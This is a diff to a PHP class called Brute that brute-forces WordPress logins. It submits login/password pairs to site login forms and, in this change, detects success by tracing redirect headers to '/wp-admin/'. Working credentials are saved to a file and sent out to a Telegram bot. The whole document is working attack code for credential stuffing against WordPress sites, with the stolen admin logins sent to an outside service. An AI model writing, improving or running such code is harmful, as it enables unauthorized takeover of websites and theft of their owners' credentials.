@@ -6,6 +6,7 @@ use Amp\Dns\DnsException;
 use Amp\Http\Client\Body\FormBody;
 use Amp\Http\Client\HttpClientBuilder;
 use Amp\Http\Client\Request;
+use Amp\Http\Client\Response;
 use Monolog\Handler\TelegramBotHandler;
 use Monolog\Logger;
 
@@ -28,13 +29,8 @@ class Brute
         $login      = $this->loginCheck($data);
         $password   = $this->passwordCheck($data, $login);
         $iteration  = $this->checkIterator($data, $login, $password);
-        $authorized = false;
-
-        $log = new Logger('name');
 
         if ($iteration == true) {
-            $log = new Logger('name');
-
             $body = new FormBody;
             $body->addField('log', $login);
             $body->addField('pwd', $password);
@@ -44,26 +40,33 @@ class Brute
             $request->setBody($body);
 
             $response = yield $this->client->request($request);
-            $cookies = isset($response->getHeaders()['set-cookie']) ? $response->getHeaders()['set-cookie'] : null;
 
-            if ($cookies) {
-                foreach ($cookies as $cookie) {
-                    if (str_contains($cookie, static::WP_COOKIE_LOGIN))
-                        $authorized = true;
-                }
+            $locations = [];
+            while (null !== $response) {
+                $locations = array_merge($locations, $response->getHeaderArray('Location'));
+                $response = $response->getPreviousResponse();
             }
 
+            $authorized = count(array_filter($locations, fn (string $location) => str_contains($location, '/wp-admin/'))) > 0;
+
+            $wp_admin = "{$url};{$login};{$password}";
             if ($authorized == true) {
-                $wp_admin = "{$url};{$login};{$password}";
-                echo "Valid: {$wp_admin}" . PHP_EOL;
+                Log::info("Valid: {$wp_admin}");
                 file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL, FILE_APPEND);
 
-                (new Telegram())->sendMessage($wp_admin);
+                try {
+                    yield (new Telegram())->sendMessage($wp_admin);
+                } catch (\Throwable $t) {
+                    Log::error(sprintf('Unable to log in telegram due to %s at %s:%d', $t->getMessage(), $t->getFile(), $t->getLine()));
+                }
+            } else {
+                Log::debug("Invalid: {$wp_admin}");
             }
         }
     }
 
-    public function checkIterator($data, $login, $password) {
+    public function checkIterator($data, $login, $password)
+    {
         if (( $login == null || $password == null) || ( $data['login'] != '{login}' && $data['login'] == $login )) {
             return false;
         } else {
@@ -71,7 +74,8 @@ class Brute
         }
     }
 
-    public function loginCheck($data) {
+    public function loginCheck($data)
+    {
         if ($data['login'] == '{login}' && !isset(explode(';', $data['url'])[1])) {
             return null;
         } elseif ($data['login'] == '{login}' && isset(explode(';', $data['url'])[1])) {
@@ -81,7 +85,8 @@ class Brute
         }
     }
 
-    public function passwordCheck($data, $login) {
+    public function passwordCheck($data, $login)
+    {
         if ($data['password'] == '{login}' && $login != null)
             return $login;
         else
